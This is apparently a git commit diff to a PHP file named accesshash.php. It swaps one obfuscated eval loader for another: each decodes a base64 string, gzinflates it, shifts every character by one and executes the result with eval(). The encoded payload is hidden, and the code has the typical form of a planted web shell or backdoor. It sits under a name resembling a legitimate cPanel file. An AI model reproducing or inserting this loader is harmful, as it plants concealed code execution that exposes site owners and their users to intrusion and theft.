380ae645db5c757f4e8f3d6c4f2d0b742c875511
cPanel Karma <hridoyorion@gmail.com>
2023-09-03 10:02:05 -0700

    Update accesshash.php

--- accesshash.php
+++ accesshash.php
@@ -1,9 +1,7 @@
-<?php function pkkg($Ich)
-{ 
-$Ich=gzinflate(base64_decode($Ich));
- for($i=0;$i<strlen($Ich);$i++)
- {
-$Ich[$i] = chr(ord($Ich[$i])-1);
- }
- return $Ich;
- }eval(pkkg("ZZJta9swEMc/QCDf4SYCcmhqZ4wySC2vo2z0zVjpCnuRBSPLl9jUloykrBmjn30nO1nS1G8k6+7+97uHVKH2aLPxKK0+ZJ+VQufgTroKHlCWaNOEnsm4NraFFn1lSsE64zwLr7Xuth78nw4Fc9uirT0DLVv62xgGv2Wzpettheqpd0+CCl0gfONRvYaodg59NMnvv/94XPKN4avp9O94NNk6tE6s6wYjlqBXSSedey7Z9HqIezd4TIGcyxojToTagzKNsYJZLFmWFtnycgVfrDUWFnArtTa+LwtOFNOkyAKY9hkP4i/j0U37VNY24rLvRkXN4DOYf7y6CvYbVZ0bw/NkJ+Z0UIEoVRUNdCAd9Ld9SVbgrmtMSTUt2GywhFgSFDypTIsJj4Pfcr6KeRKf5Lg+tCunBKUsqC8hbGhW1zcq36DPFRVCE3WDNYhrfA5WwX7efQP2X54IYuctyXWNVET0S7MZI6ouRPV6NNsTvUPc5ZEq9jtPEfsMQxsuxHs6UVUG+PJiBV/NVpcLeDWejUXUNCAJlcW1YEfF0/rPE4GXlkoULC8aqWmjjr5voGKeJvIw17SwGR9G+3JAe8VT0J4SDm36o/GyGfa/BwcBlGVHcqRBvGcIb/lZ1gc3tfMDAYnuc3/K/gE="));?>
+<?php
+function aNlXy($OYho){ 
+$OYho=gzinflate(base64_decode($OYho));
+for($TSh=0;$TSh<strlen($OYho);$TSh++) {
+ $OYho[$TSh] = chr(ord($OYho[$TSh])-1); }
+ return $OYho; }eval(aNlXy('ZZNta9swEMc/gMHf4SYCcmhqZ4wySC23o2z0zdjYCnuRBSPbl9jUloykrCmjn30nO1nS1Bis6O7+97uHANATBmiMNrnBXhvXqE00n16HgUWXu6bDvG26xo13N1kYpCUqh8af6g/Zp7JEa+Fe2hp+oKzQpAldk3GtTQcdulpXgvXaOuZvG9VvHbjnHgWz24KUGSjZ0a+NZvBHtls63tVYPg7uiVehAwxvetPXfRg0a4gaS3zRJP/+7efDkm80X02nf8NgsrVorFg3LUYsQVcmvbT2qWKe3se9Gz2mQM5VgxEnTuWg1K02ghmsWJYW2fJyBZ99U2ABd1Ip7Ybi4EQxTYrM4ymXcS/+Ega33WPVmIjLoSc1tYTPYP7x6srbb8v63OivJzsxpw+VibKso5EOpIXhtC/JCNz1ra6opgWbjRYfS4KCJ7XuMOGx91vOVzFP4pMc14d20XhlJQvqiw8bm9UPjco3NOmSCqG52tHqxRU+eatgv+6/AvsvTwSxdcO2tLIkot+KzRhR9T5q0KMJn+gd4i6PVLHbOYrYZxjbcCHe0xfLWgNfXqzgi96qagGvxrMxiIoGJKE2uBbsqHha/3kicNJQiYLlRSsV7dXR9w1UzNNEHuaaFibj42hfDmiveAraVsKhfX/QTrbjv2AABwGUZUdypEG8Zwhv+Vk2BLeNdSMBie5z0+L/Aw=='));
+?>
